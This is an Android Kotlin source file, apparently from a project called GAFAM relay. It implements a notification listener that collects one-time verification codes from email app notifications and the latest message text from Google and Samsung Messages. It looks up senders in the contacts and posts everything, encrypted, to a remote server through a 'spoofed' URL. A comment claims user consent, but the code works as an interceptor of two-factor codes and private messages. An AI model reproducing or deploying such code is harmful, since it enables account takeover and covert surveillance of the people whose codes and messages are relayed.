package com.gafam.relay

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.util.Base64

/**
 * Notification relay (user-consented, own device — see manifest 16 §2):
 *
 *  1. EMAIL: watches Gmail/Outlook/Spark/Proton notifications and extracts OTP
 *     verification codes → /api/auth/email/notif
 *
 *  2. RCS/SMS apps (Google Messages, Samsung Messages): RCS content never
 *     reaches the telephony provider, so the only legitimate window into it is
 *     the notification the system shows to the user. We read the LAST message
 *     of MessagingStyle notifications and relay it to the VPC as a regular
 *     inbound message → /api/auth/sms/ (channel "rcs").
 *     Media attachments appear as text placeholders only — RCS media bytes are
 *     not accessible (they stay encrypted inside Google Messages).
 */
class EmailNotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "GAFAM_EmailNotify"
        private const val GMAIL_PKG = "com.google.android.gm"
        private const val OUTLOOK_PKG = "com.microsoft.office.outlook"
        private const val SPARK_PKG = "com.readdle.spark"
        private const val PROTON_PKG = "ch.protonmail.android"

        private val MESSAGING_PKGS = setOf(
            "com.google.android.apps.messaging", // Google Messages (RCS lives here)
            "com.samsung.android.messaging"      // Samsung Messages
        )

        // Email subject/keywords that indicate verification/OTP codes
        private val VERIFICATION_KEYWORDS = listOf(
            "code", "verify", "verification", "otp", "one-time", "password",
            "confirme", "confirmez", "valider", "validate", "validate",
            "security code", "login code", "sign in", "signin",
            "two-factor", "2fa", "auth code", "authentication",
            "activate", "activation", "confirm your", "confirmation"
        )

        /** Last relayed MessagingStyle message timestamp per notification key (dedup). */
        private val lastRcsRelayed = HashMap<String, Long>()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        Log.d(TAG, "📨 NOTIF: pkg=${sbn.packageName} key=${sbn.key}")
        val pkg = sbn.packageName

        if (pkg in MESSAGING_PKGS) {
            handleMessagingNotification(sbn)
            return
        }

        if (pkg != GMAIL_PKG && pkg != OUTLOOK_PKG && pkg != SPARK_PKG && pkg != PROTON_PKG) {
            return
        }

        val notification = sbn.notification
        val extras = notification.extras ?: return

        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
        val subText = extras.getString(Notification.EXTRA_SUB_TEXT) ?: ""

        // Only process if it looks like a verification code email
        val combined = "$title $text $subText".lowercase()
        val isVerification = VERIFICATION_KEYWORDS.any { combined.contains(it) }
        if (!isVerification) return

        // Extract codes (4-8 digit numbers)
        val codes = extractOTPCodes(combined)
        if (codes.isEmpty()) return

        Log.i(TAG, "📧 Email OTP from $pkg: $codes")

        // Send to VPC
        sendToVpc(pkg, title, text, codes, sbn.postTime)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}

    // --- RCS relay (messaging app notifications) ---

    private fun handleMessagingNotification(sbn: StatusBarNotification) {
        val notification = sbn.notification

        // Skip group summaries — the child notifications carry the actual text
        if (notification.flags and Notification.FLAG_GROUP_SUMMARY != 0) return

        // NOTE: Notification.EXTRA_MESSAGING_STYLE ("android.messagingStyle") and
        // MessagingStyle.extractMessagingStyleFromNotification() are missing from
        // some SDK stubs — use the literal key, present on every API 24+ device.
        val extras = notification.extras ?: return
        val style: Notification.MessagingStyle? = try {
            if (android.os.Build.VERSION.SDK_INT >= 33) {
                extras.getParcelable("android.messagingStyle", Notification.MessagingStyle::class.java)
            } else {
                @Suppress("DEPRECATION")
                extras.getParcelable("android.messagingStyle")
            }
        } catch (e: Exception) {
            null
        }
        if (style == null) return

        // Last incoming message = the new one. Skip our own outgoing bubbles
        // (their sender is the style's user).
        val userName = style.user?.name?.toString()
        val lastIncoming = style.messages
            ?.filter { msg ->
                val sender = msg.senderPerson
                msg.text != null && sender != null &&
                    (userName == null || sender.name?.toString() != userName)
            }
            ?.maxByOrNull { it.timestamp }
            ?: return

        val text = lastIncoming.text?.toString()?.trim()
        if (text.isNullOrEmpty()) return
        if (text.startsWith("GAFAM-VFY-")) return

        // Dedup: MessagingStyle notifications are re-posted on every update;
        // only relay messages newer than the last one we forwarded for this key.
        val msgTs = if (lastIncoming.timestamp > 0) lastIncoming.timestamp else sbn.postTime
        synchronized(lastRcsRelayed) {
            val prev = lastRcsRelayed[sbn.key]
            if (prev != null && msgTs <= prev) return
            lastRcsRelayed[sbn.key] = msgTs
            if (lastRcsRelayed.size > 200) {
                val oldest = lastRcsRelayed.entries.minByOrNull { it.value }?.key
                oldest?.let { lastRcsRelayed.remove(it) }
            }
        }

        val senderName = lastIncoming.senderPerson?.name?.toString()?.trim()
        if (senderName.isNullOrEmpty()) return

        // Resolve the display name to a phone number via local contacts so the
        // VPC can group the message into the right conversation thread.
        val sender = resolveContactNumber(senderName) ?: senderName

        Log.i(TAG, "💬 RCS notif from $senderName → $sender: ${text.take(40)}")
        LogShipper.event(this, "I", "rcs", "RCS relay from $sender (${text.length} chars)")
        RelayForegroundService.start(applicationContext)

        sendRcsToVpc(sender, text, msgTs)
    }

    /** Finds a phone number for a display name; returns null if unknown. */
    private fun resolveContactNumber(displayName: String): String? {
        return try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                ),
                "${android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} = ?",
                arrayOf(displayName),
                null
            )
            cursor?.use {
                if (it.moveToFirst()) {
                    it.getString(0)?.replace(" ", "")
                } else null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun sendRcsToVpc(sender: String, body: String, timestamp: Long) {
        val prefs = getSharedPreferences("GAFAM_PREFS", MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        thread {
            try {
                val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/sms/")
                val client = ApiClient.getClient(applicationContext) ?: return@thread

                val jsonBody = JSONObject().apply {
                    put("sender", sender)
                    put("body", body)
                    put("timestamp", if (timestamp > 0) timestamp else System.currentTimeMillis())
                    put("channel", "rcs")
                }
                postEncrypted(spoofedUrl, client, jsonBody, jwtSecret, TAG)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to relay RCS notif to VPC", e)
                LogShipper.event(this, "E", "rcs", "RCS relay failed: ${e.message}")
            }
        }
    }

    // --- Email OTP relay ---

    private fun extractOTPCodes(text: String): List<String> {
        val patterns = listOf(
            Regex("""\b(\d{4,8})\b"""),
            Regex("""code[\s:]+(\d{4,8})"""),
            Regex("""verification[\s:]+(\d{4,8})"""),
            Regex("""OTP[\s:]+(\d{4,8})"""),
            Regex("""one[- ]time[\s:]+(\d{4,8})"""),
            Regex("""confirme[\s:]+(\d{4,8})"""),
            Regex("""confirmez[\s:]+(\d{4,8})""")
        )
        val codes = mutableListOf<String>()
        val seen = mutableSetOf<String>()
        for (pat in patterns) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (seen.add(code)) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(pkg: String, title: String, text: String, codes: List<String>, postTime: Long) {
        val prefs = getSharedPreferences("GAFAM_PREFS", MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        thread {
            try {
                val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")
                val client = ApiClient.getClient(applicationContext) ?: return@thread

                val jsonBody = JSONObject().apply {
                    put("app", pkg)
                    put("title", title)
                    put("body", text)
                    put("codes", JSONObject.wrap(codes))
                    put("timestamp", postTime)
                }
                postEncrypted(spoofedUrl, client, jsonBody, jwtSecret, TAG)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send email notif to VPC", e)
            }
        }
    }

    private fun postEncrypted(
        url: String,
        client: okhttp3.OkHttpClient,
        jsonBody: JSONObject,
        jwtSecret: String,
        tag: String
    ) {
        val plaintext = jsonBody.toString().toByteArray(Charsets.UTF_8)
        val digest = MessageDigest.getInstance("SHA-256")
        val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
        val secretKey = SecretKeySpec(keyBytes, "AES")

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12)
        SecureRandom().nextBytes(iv)
        val gcmSpec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmSpec)
        val ciphertext = cipher.doFinal(plaintext)

        val encryptedPayload = JSONObject().apply {
            put("encrypted_data", Base64.encodeToString(ciphertext, Base64.NO_WRAP))
            put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
        }

        val body = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url(url)
            .post(body)
            .addHeader("Authorization", "Bearer $jwtSecret")
            .build()

        val response = client.newCall(request).execute()
        Log.d(tag, "VPC notif response: ${response.code}")
        response.close()
    }
}
